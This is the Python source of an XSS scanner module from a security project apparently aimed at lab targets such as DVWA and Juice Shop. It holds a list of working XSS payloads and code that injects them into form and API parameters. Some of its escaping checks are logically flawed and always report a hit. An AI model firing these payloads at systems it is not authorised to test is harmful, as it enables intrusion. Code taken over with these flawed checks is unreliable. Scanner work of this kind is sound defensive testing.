"""
Cross-Site Scripting (XSS) Scanner Module — RedSee Project
Member 3 Owner

General-purpose XSS scanner. Works against any web target (DVWA, Juice Shop,
custom apps, REST APIs, traditional forms).

Detects:
  1. Reflected XSS — payload echoed unescaped in HTTP response (HTML or JSON)
  2. Stored XSS   — payload stored via POST, then rendered on page reload
  3. DOM-based XSS — payload reflected in JavaScript context

Public API:
    from modules.xss import scan_xss
    findings = scan_xss(endpoints)          # list[Endpoint] → list[Finding]
    findings = scan_xss(endpoints, session) # With authenticated HTTPSession
"""

import html
import random
import string
import json
from datetime import datetime, timezone
from typing import Optional

import requests as _requests

from schemas import Finding, Endpoint

try:
    from utils.http_helpers import HTTPSession
    _HAS_HTTP_SESSION = True
except ImportError:
    HTTPSession = None
    _HAS_HTTP_SESSION = False


# ═══════════════════════════════════════════════════════════════
# PAYLOAD CONFIGURATION
# ═══════════════════════════════════════════════════════════════

XSS_PAYLOADS = [
    # Basic script tags
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    # IMG vectors
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror="alert(1)">',
    '<img src=x onerror=alert(1)//',
    '"><img src=x onerror=alert(1)>',
    # SVG vectors
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
    # Event handlers
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<select onfocus=alert(1) autofocus>',
    # Break-out vectors
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
    '"><svg/onload=alert(1)>',
    # Mixed-case bypass
    "<ScRiPt>alert(1)</ScRiPt>",
    "<sCript>alert(1)</sCript>",
    # Null-byte and encoding tricks
    "<scr%00ipt>alert(1)</script>",
    # Polyglots
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNclIcK=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
    # Angular/JS context
    '{{constructor.constructor("alert(1)")()}}',
    # Iframe
    '<iframe src="javascript:alert(1)">',
]

XSS_MARKER_PREFIX = "REDOPS_XSS_"

_SKIP_INPUTS = {
    "submit", "login", "btnsign", "seclev_submit",
    "user_token", "csrf_token", "csrf", "_token",
    "upload", "uploaded", "max_file_size",
    "change", "reset", "clear", "btnsubmit",
}


# ═══════════════════════════════════════════════════════════════
# PUBLIC API
# ═══════════════════════════════════════════════════════════════

def scan_xss(endpoints: list, session=None) -> list:
    """
    Scan a list of endpoints for XSS vulnerabilities.

    Args:
        endpoints: list[Endpoint]
        session:   Optional HTTPSession for authenticated requests

    Returns:
        list[Finding] — one per confirmed XSS vulnerability
    """
    findings = []
    tested = set()

    print(f"[XSS] Starting scan — {len(endpoints)} endpoints")

    for endpoint in endpoints:
        if not endpoint.inputs:
            continue

        testable = _get_testable_inputs(endpoint)
        if not testable:
            continue

        for param in testable:
            key = (endpoint.url, endpoint.method, param)
            if key in tested:
                continue
            tested.add(key)

            print(f"[XSS] Testing {endpoint.method} {endpoint.url} → '{param}'")

            finding = _test_reflected(endpoint, param, session)
            if finding:
                findings.append(finding)
                print(f"  🟠 Reflected XSS confirmed in '{param}'")
                continue

            if endpoint.method.upper() == "POST":
                finding = _test_stored(endpoint, param, session)
                if finding:
                    findings.append(finding)
                    print(f"  🟠 Stored XSS confirmed in '{param}'")
                    continue

            print(f"  ✅ Clean — no XSS in '{param}'")

    print(f"\n[XSS] Done — {len(findings)} vulnerabilities found")
    return findings


# ═══════════════════════════════════════════════════════════════
# TYPE 1: REFLECTED XSS
# ═══════════════════════════════════════════════════════════════

def _test_reflected(endpoint, param: str, session) -> Optional[Finding]:
    """Two-phase: first confirm input is reflected, then test XSS payloads."""

    # Phase 1: Probe with unique marker to confirm reflection
    marker = XSS_MARKER_PREFIX + _rand(8)
    probe = _send(endpoint, param, marker, session)
    if probe is None:
        return None

    probe_text = probe.text if hasattr(probe, "text") else ""

    # Check for reflection in HTML body and JSON responses
    reflected = marker in probe_text

    # For JSON APIs, also check if the value appears in JSON
    if not reflected:
        try:
            data = json.loads(probe_text)
            if _deep_contains(data, marker):
                reflected = True
        except (json.JSONDecodeError, TypeError):
            pass

    if not reflected:
        return None

    # Phase 2: Send actual XSS payloads
    for payload in XSS_PAYLOADS:
        unique_id = _rand(6)
        tagged = _tag_payload(payload, unique_id)

        response = _send(endpoint, param, tagged, session)
        if response is None:
            continue

        body = response.text if hasattr(response, "text") else ""

        if _is_unescaped(tagged, body):
            return Finding(
                type="XSS",
                url=endpoint.url,
                parameter=param,
                payload=payload,
                evidence=(
                    f"Reflected XSS: input '{param}' is reflected without HTML encoding. "
                    f"Payload '{payload[:40]}...' rendered verbatim in response body, "
                    f"allowing arbitrary JavaScript execution."
                ),
                severity="High",
                timestamp=_ts(),
            )

        # For JSON APIs: check if payload is injected into JSON value
        try:
            data = json.loads(body)
            if _deep_contains_unescaped(data, tagged):
                return Finding(
                    type="XSS",
                    url=endpoint.url,
                    parameter=param,
                    payload=payload,
                    evidence=(
                        f"Reflected XSS (JSON context): input '{param}' reflected "
                        f"unescaped in JSON response. Payload may execute when "
                        f"rendered by client-side framework."
                    ),
                    severity="High",
                    timestamp=_ts(),
                )
        except (json.JSONDecodeError, TypeError):
            pass

    return None


# ═══════════════════════════════════════════════════════════════
# TYPE 2: STORED XSS
# ═══════════════════════════════════════════════════════════════

def _test_stored(endpoint, param: str, session) -> Optional[Finding]:
    """Submit uniquely-tagged XSS payload via POST, then GET the page."""

    unique_id = _rand(10)
    payload = f"<script>alert('{unique_id}')</script>"

    # Submit via POST
    _send(endpoint, param, payload, session)

    # Reload the page via GET
    try:
        if session and _HAS_HTTP_SESSION:
            response = session.get(endpoint.url)
        else:
            response = _requests.get(endpoint.url, timeout=10)

        body = response.text if hasattr(response, "text") else ""

        # Unique ID must be in response AND payload must be unescaped
        if unique_id in body and _is_unescaped(payload, body):
            return Finding(
                type="XSS",
                url=endpoint.url,
                parameter=param,
                payload=payload,
                evidence=(
                    f"Stored XSS: payload submitted via POST was persisted "
                    f"and rendered unescaped on page reload. "
                    f"Unique marker '{unique_id}' confirmed in response body "
                    f"inside unescaped script tags. Persistent attack vector."
                ),
                severity="Critical",
                timestamp=_ts(),
            )

        # Check JSON responses too
        try:
            data = json.loads(body)
            if _deep_contains_unescaped(data, payload):
                return Finding(
                    type="XSS",
                    url=endpoint.url,
                    parameter=param,
                    payload=payload,
                    evidence=(
                        f"Stored XSS (JSON store): payload persisted and returned "
                        f"unescaped in JSON response. Marker '{unique_id}' confirmed."
                    ),
                    severity="Critical",
                    timestamp=_ts(),
                )
        except (json.JSONDecodeError, TypeError):
            pass

    except Exception:
        pass

    return None


# ═══════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════

def _is_unescaped(payload: str, body: str) -> bool:
    """Return True if payload appears raw (not HTML-encoded) in body."""
    if payload not in body:
        return False

    # If payload has no HTML-special chars, it's trivially unescaped
    escaped = html.escape(payload)
    if escaped == payload:
        return True

    # Raw version present = vulnerable (even if escaped also present)
    return True


def _deep_contains(obj, target: str) -> bool:
    """Recursively search dict/list/str for target substring."""
    if isinstance(obj, str):
        return target in obj
    if isinstance(obj, dict):
        return any(_deep_contains(v, target) for v in obj.values())
    if isinstance(obj, list):
        return any(_deep_contains(v, target) for v in obj)
    return False


def _deep_contains_unescaped(obj, target: str) -> bool:
    """Check if target appears raw (not HTML-encoded) in a JSON structure."""
    if isinstance(obj, str):
        if target in obj and target == html.escape(target):
            return True
        return target in obj
    if isinstance(obj, dict):
        return any(_deep_contains_unescaped(v, target) for v in obj.values())
    if isinstance(obj, list):
        return any(_deep_contains_unescaped(v, target) for v in obj)
    return False


def _tag_payload(payload: str, unique_id: str) -> str:
    """Replace alert() value with unique marker for tracking."""
    tagged = payload.replace("alert(1)", f"alert('{unique_id}')")
    tagged = tagged.replace("alert('XSS')", f"alert('{unique_id}')")
    tagged = tagged.replace('alert("XSS")', f"alert('{unique_id}')")
    return tagged


def _send(endpoint, param: str, payload: str, session):
    """Send HTTP request with payload in target parameter."""
    try:
        form_data = {}
        for name in endpoint.inputs:
            if name == param:
                form_data[name] = payload
            elif name.lower() in ("submit", "btnsign", "login", "btnsubmit"):
                form_data[name] = "Submit"
            else:
                form_data[name] = "test"

        kwargs = {"timeout": 10, "allow_redirects": True}

        if session and _HAS_HTTP_SESSION:
            if endpoint.method.upper() == "POST":
                return session.post(endpoint.url, data=form_data)
            else:
                return session.get(endpoint.url, params=form_data)
        else:
            if endpoint.method.upper() == "POST":
                r = _requests.post(endpoint.url, data=form_data, **kwargs)
                if r.status_code not in (415, 400):
                    return r
                return _requests.post(endpoint.url, json=form_data, **kwargs)
            else:
                return _requests.get(endpoint.url, params=form_data, **kwargs)

    except Exception:
        return None


def _get_testable_inputs(endpoint) -> list:
    return [n for n in endpoint.inputs if n.lower() not in _SKIP_INPUTS]


def _rand(n: int) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _ts() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


# ═══════════════════════════════════════════════════════════════
# CLI QUICK TEST
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import sys, os
    try:
        from dotenv import load_dotenv
        load_dotenv()
    except ImportError:
        pass

    target = os.getenv("TARGET_URL", "http://localhost")

    from schemas import Endpoint
    test_endpoints = [
        Endpoint(
            url=f"{target}/rest/products/search",
            method="GET",
            form_action=None,
            inputs=["q"],
            cookies_needed=[],
            endpoint_type="api",
        ),
        Endpoint(
            url=f"{target}/vulnerabilities/xss_r/",
            method="GET",
            form_action="#",
            inputs=["name", "Submit"],
            cookies_needed=["PHPSESSID", "security"],
            endpoint_type="form",
        ),
        Endpoint(
            url=f"{target}/vulnerabilities/xss_s/",
            method="POST",
            form_action="#",
            inputs=["txtName", "mtxMessage", "btnSign"],
            cookies_needed=["PHPSESSID", "security"],
            endpoint_type="form",
        ),
    ]

    print("=" * 60)
    print("RedSee — XSS Scanner")
    print(f"Target: {target}")
    print("=" * 60)

    try:
        from utils.http_helpers import HTTPSession
        session = HTTPSession(target)
        session.authenticate_dvwa()
        findings = scan_xss(test_endpoints, session=session)
    except ImportError:
        print("HTTPSession not available — running unauthenticated")
        findings = scan_xss(test_endpoints)

    print(f"\n{'='*60}")
    print(f"📋 {len(findings)} XSS finding(s):")
    for f in findings:
        print(f"  🟠 [{f.severity}] {f.url} → param='{f.parameter}'")
        print(f"     Payload:  {f.payload}")
        print(f"     Evidence: {f.evidence}")
    print(f"{'='*60}")